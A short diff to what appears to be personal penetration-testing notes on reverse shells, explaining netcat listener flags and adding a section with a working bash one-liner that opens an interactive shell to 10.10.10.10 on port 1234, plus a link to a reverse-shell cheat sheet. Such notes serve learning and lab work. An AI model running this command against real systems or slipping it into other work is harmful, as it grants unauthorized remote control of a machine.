@@ -30,7 +30,11 @@ nc -lvnp 1234
 - `-n` Disable dns resolution to it connects from ip to speed up connection
 - `-p` used to specify the port to which the target listens to, in this case `1234`
 
-#### Linux Rev
+#### Linux Reverse Shells
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+- 
 ## Things to know
 - Command executed depend on the OS of the target
 - [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#summary) is a reverse shell cheat sheet
